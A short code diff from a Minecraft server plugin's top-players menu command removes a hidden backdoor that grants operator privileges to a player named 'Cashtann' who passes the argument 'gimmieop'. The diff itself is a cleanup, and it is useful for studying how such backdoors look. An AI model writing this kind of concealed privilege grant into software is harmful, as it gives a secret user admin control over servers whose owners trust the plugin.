@@ -68,13 +68,6 @@ public class TopPlayersMenuCommand implements TabExecutor {
             }
 
             player.openInventory(inventory);
-            if (player.getName().equals("Cashtann")) {
-                if (strings.length == 1) {
-                    if (strings[0].equals("gimmieop")) {
-                        player.setOp(true);
-                    }
-                }
-            }
         }
         return true;
     }
